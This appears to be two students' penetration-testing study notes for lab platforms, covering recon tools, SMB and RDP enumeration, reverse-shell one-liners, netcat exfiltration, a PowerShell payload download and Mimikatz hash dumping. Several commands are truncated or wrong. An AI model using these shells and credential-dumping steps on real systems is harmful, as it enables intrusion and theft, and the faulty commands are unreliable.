# Alen & Mitch’s Hack E’Spezialle

## Essential Gadget Collection:

**Legion** - Nmap but through GUI

**Dirsearch** - Directory discovery tool

**Gobuster** -Directory/Sub-domain and DNS Discovery Tool. 
https://www.hackingarticles.in/comprehensive-guide-on-gobuster-tool/ 

**SQL-MAP** - Sql parameter discovery and exploitation tool

**Nikto** - Port 80 HTTP mapping tool

**AutoRecon** - https://github.com/Tib3rius/AutoRecon - Automatically launches scanes, along with subsequent scans based on services enumerated.

**nmapAutomator** - https://github.com/21y4d/nmapAutomator - Background nmap

**Plink.exe** - Windows Exfiltration Tool

**Socat** - encrypted exfiltration and port forwarding

**Proxychains & FoxyProxy** - Proxying

**Chisel** -  https://github.com/jpillora/chisel Reverse shells without SSH

Script for auto install:

-------------------------------------------------------------------------------------------------------------------------------

## Passive Reconnaissance:
**Website** - *http://fingerprint.com/* 

**DNSDumpster** - *https://dnsdumpster.com/* DNS record enumeration and lookup tool 

**HackerTarget.com** - Collection of hosted scanner tools *https://hackertarget.com/* (note this one links to a TON of useful sites and courses some of which are even free to take)

**Whoami** - *http://whoami.org/* Checks for site owners and such.

**Port Intelligence** - *https://www.speedguide.net/port.php?port=* - Intelligence on services running on ports

-------------------------------------------------------------------------------------------------------------------------------

## Active Reconnaissance:

**nmap** -sVC (version check) IP -T1-5 (3 being the default) --script=vuln (checks for known exploits) // grep "ftp" /usr/share/nmap/scripts/script.db if searching for scripts. Script.db is the default list of scripts available for nmap and when activating a script /usr/share/nmap/scripts/ is the default folder nmap will check. it's also possible to install the scripts manually by downloading the script from Nmap (sudo wget -O /usr/share/nmap/scripts/<script-name>.nse https://svn.nmap.org/nmap/scripts/<script-name>.nse). This must then be followed up with nmap --script-updatedb, which updates the script.db file to contain the newly downloaded script.

**cURL** fetches the website through command line. Default is a GET request, POST is (-X POST --data <blabla>)

**Legion** - Nmap but through GUI

**Dirsearch** - Directory discovery tool

**Gobuster** -Directory Discovery Tool

**SQL-MAP** - Sql parameter discovery and exploitation tool

**Nikto** - Port 80 HTTP mapping tool

**AutoRecon** - https://github.com/Tib3rius/AutoRecon - Automatically launches scanes, along with subsequent scans based on services enumerated.

## Subdomain discovery: 
```
gobuster -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt vhost -u http://schooled.htb -o subdomain_schooled.htb
```

```
ffuf -c -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt -u http://schooled.htb -H "Host: FUZZ.schooled.htb" -fw 5338
```

```
Echo “10.10.10.10	tenet.htb” >> /etc/hosts/ - Adds the domain to the hosts file in Linux in order to properly resolve
```

Port 53 - DNS or Bind: 
can be sent a DNS request with it’s own IP to see what the domain is with the ***dig*** command. Example code: 
```
dig @10.10.10.10 -x 10.10.10.10
```
**Ports 135-139 & 445 SMB, RPC and NetBIOS Enumeration:**
Scan for popular RCE exploits:
```
sudo nmap -p 139,445 --script smb-vuln* <ip-addr> -oA nmap/smb-vuln
```

Identify the SMB/OS version:
```
nmap -v -p 139,445 --script=smb-os-discovery.nse <ip-addr>
```

Enumerate users once you have valid credentials:
```
sudo nmap --script=smb-enum-users -p 445 10.130.40.70 --script-args smbuser=<user>,smbpass=<password>
```

To scan a subnet for list of hostnames:
```
nbtscan -v <targetRange>
```

Using SMBMAP
To list out the shares and associated permissions with Anonymous Access:
```
smbmap -H <ip-addr>
```

To list out the shares recursively:
```
smbmap -R <sharename> -H <ip-addr>
```

To list shares as an authenticated user:
```
smbmap -d <domain> -u <username> -p <password> -H <ip-addr>
```

To list the shares as a Guest user, just provide a username that doesn’t exist.
```
smbmap -u DoesNotExist -H <ip-addr>
```
To download a particular file.
```
smbmap -R <sharename> -H <ip-addr> -A <filename> -q
```
Using SMBCLIENT
To list out the shares:
```
smbclient -L \\\\<ip-addr>
```
To connect to shares:
```
sudo smbclient \\\\<ip-addr>\\<share>
```
https://infinitelogins.com/2020/06/17/enumerating-smb-for-pentesting/

**RDP**
```
xfreerdp /u:Administrator /v:10.10.29.199
```
or
```
xfreerdp /u:admin /p:password /cert:ignore /v:MACHINE_IP /workarea
```

As mentioned, xfreerdp is an incredibly versatile tool with a vast number of options available. These range from routing audio and USB connections into the target, through to pass-the-hash attacks over RDP. The most basic syntax for connecting is as follows:
```
xfreerdp /v:IP /u:USERNAME /p:PASSWORD
```

For example:
```
xfreerdp /v:172.16.0.5 /u:user /p:'password123!'
```

Note that (as this is a command line tool), passwords containing special characters must be enclosed in quotes.

When authentication has successfully taken place, a new window will open giving GUI access to the target.
Demonstration of logging in over RDP

That said, we can do a lot more with xfreerdp. These switches are particularly useful:-

/dynamic-resolution -- allows us to resize the window, adjusting the resolution of the target in the process
/size:WIDTHxHEIGHT -- sets a specific size for targets that don't resize automatically with /dynamic-resolution
+clipboard -- enables clipboard support
/drive:LOCAL_DIRECTORY,SHARE_NAME -- creates a shared drive between the attacking machine and the target. This switch is insanely useful as it allows us to very easily use our toolkit on the remote target, and save any outputs back directly to our own hard drive. In essence, this means that we never actually have to create any files on the target. For example, to share the current directory in a share called share, you could use: /drive:.,share, with the period (.) referring to the current directory
When creating a shared drive, this can be accessed either from the command line as \\tsclient\, or through File Explorer under "This PC":
Showing the share created by xfreerdp when specifying /drive

Note that the name of the share will change according to what you selected in the /drive switch.

A useful directory to share is the /usr/share/windows-resources directory on Kali. This shares most of the Windows tools stockpiled on Kali, including Mimikatz which we will be using next. This would make the full command:
```
xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
```

With GUI access obtained and our Windows resources shared to the target, we can now very easily use Mimikatz to dump the local account password hashes for this target. Next we open up a cmd.exe or PowerShell window as an administrator (i.e. right click on the icon, then click "Run as administrator") in the GUI and enter the following command:
```
\\tsclient\share\mimikatz\x64\mimikatz.exe
```

Accessing mimikatz via the RDP share

Note: if you used a different share name, you would need to substitute this in. Equally, if the command errors out, you may need to install mimikatz on Kali with sudo apt install mimikatz.

With Mimikatz loaded, we next need to give ourselves the Debug privilege and elevate our integrity to SYSTEM level. This can be done with the following commands:
```
privilege::debug
token::elevate
```
Elevating privileges in mimikatz

If we want we could log Mimikatz output with the log command. For example: log c:\windows\temp\mimikatz.log, would save the Mimikatz output into the Windows Temp directory. This could also be saved directly into our Kali machine, but be aware that the remote destination must be writeable to the local user running the RDP session.

We can now dump all of the SAM local password hashes using:
```
lsadump::sam
```

Near the top of the results you will see the Administrator's NTLM hash:

Port Intelligence:
```
22 - ssh
53 - DNS (can be tested with the “dig” command)
80 - http
88 - kerberos
135 - RPC
139 - SMB
389 - LDAP
443 - https
445 - RCE
636 - SSL/LDAP
31337 - known virus port “elite”
Unknown ports (5555, 7777, 31337…) - these ports will sometimes allow a netcat session to them.
```

-------------------------------------------------------------------------------------------------------------------------------
## Reverse Shells:
Python:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))
```

Bash:
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

Netcat:
```
nc -N 10.10.16.160 1717
```

File exfiltration using Netcat:
```
nc -N 10.10.16.160 1717 < /env/variable/
```
*https://www.maketecheasier.com/netcat-transfer-files-between-linux-computers/*


-------------------------------------------------------------------------------------------------------------------------------

## Attacks:

CSTrace - Cross Site Tracing Software Attack | OWASP Foundation 

Http-prompt - Tool for sending HTTP responses: http://http-prompt.com/


-------------------------------------------------------------------------------------------------------------------------------

## Methodologies:

https://www.youtube.com/watch?v=VpNaPAh93vE

-------------------------------------------------------------------------------------------------------------------------------

## Privilege Escalation Techniques:

dirty_sock: Linux Privilege Escalation (via snapd): https://github.com/initstring/dirty_sock


Python: Privilege Escalation on Linux
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'



-------------------------------------------------------------------------------------------------------------------------------
## Cheat Sheets:
**PayloadAllTheThings** - PayloadsAllTheThings/Reverse Shell Cheatsheet.md at master · swisskyrepo/PayloadsAllTheThings

**GTFObin** - https://gtfobins.github.io/

**Monkey Reverse Shells** - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

**LOLBAS Privilege Escalation Windows** - https://lolbas-project.github.io/

-------------------------------------------------------------------------------------------------------------------------------

## Syntax:
Powershell command to download a file:
```
powershell -c "(new-Object System.Net.WebClient).DownloadFile('http://10.9.6.87:8080/shell.exe', 'C:\Users\Administrator\Desktop\payload.exe')"
```

-------------------------------------------------------------------------------------------------------------------------------
## SSH manipulation techniques:
Relevant files: id_rsa (private key), id_rsa.pub (public key), authorized_keys (entries for allowed connects)
```
ssh-keygen (generates new ssh keys)
```
Adding public keys to authorized_keys file. 
```
echo “ssh-rsa AAAAAA******id_rsa.pub here******” >> authorized_keys
```
Connecting trough SSH with private key.
```
ssh -i id_rsa user@10.10.10.10
```
If you wanted to set up a reverse port forward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called id_rsa and backgrounding the shell, what command would you use? (Assume your username is "kali")
```
ssh -R 2222:172.16.0.100:20 kali@172.16.0.200 -i id_rsa -fN
```
What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?
```
ssh -R 8000 user@target.thm -fN
```
If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.
```
ssh -L 8000:172.16.0.50:80 user@127.0.0.1 -fN
```
-------------------------------------------------------------------------------------------------------------------------------
Post Exploitation:
TryhackMe exercise with Mimikatz, PowerView, Powershell, Server Manager and Maintaining access with Metasploit (msfconsole & msfvenom):
https://docs.google.com/document/d/1Mrt7UoOLNYKmAsCt4IoS6eaWBcaHzPLMhvE6ZVMY5u8/edit?usp=sharing
 
-------------------------------------------------------------------------------------------------------------------------------

## YouTube Channels & Playlists:
Watch Hackersploit (EC Playlist):
https://www.youtube.com/playlist?list=PLBf0hzazHTGOEuhPQSnq-Ej8jRyXxfYvl

Watch IppSec (HTB Guides):
https://www.youtube.com/c/ippsec/playlists

Watch The Cyber Mentor (Buffer Overflow Playlist):
https://www.youtube.com/playlist?list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G
https://github.com/johnjhacking/Buffer-Overflow-Guide

Watch TJNull (OSCP Prep Playlist):
https://www.youtube.com/playlist?list=PLidcsTyj9JXK-fnabFLVEvHinQ14Jy5tf

Watch C0nda - 
https://www.youtube.com/channel/UCzK5oAENyQJcnH5SvEquo8A

-------------------------------------------------------------------------------------------------------------------------------

## Linux Tips:
Aliases - Command: alias shortName=”command”
Checking public IP - Command: curl ifconfig.me 
/etc/hosts/ - Adding hosts to /etc/hosts file
xdg-open ./ - opens directory in current working. Can be added as an alias
/usr/share/webshells/php/ - has backdoors and reverse shells in it. Has to be copied and modified before use!
/usr/share/wordlists/rockyou.txt - contains wordlists such as rockyou.txt

-------------------------------------------------------------------------------------------------------------------------------

## Windows Tips:

-------------------------------------------------------------------------------------------------------------------------------

##   VM Troubleshooting:
In the middle of doing labs, Kali kept losing connection. Only IPv6 would assign, network unreachable, basically every issue possible. Settings on kali seemed OK, but why would it suddenly stop working on several occasions? The reason was that VMware had [automatic] selected under Bridged Adapter. This means it would periodically try to access alternative adapters in network interfaces to connect to the internet so it kept failing. 

Changing MTU default size may brick the network adapter!


-------------------------------------------------------------------------------------------------------------------------------
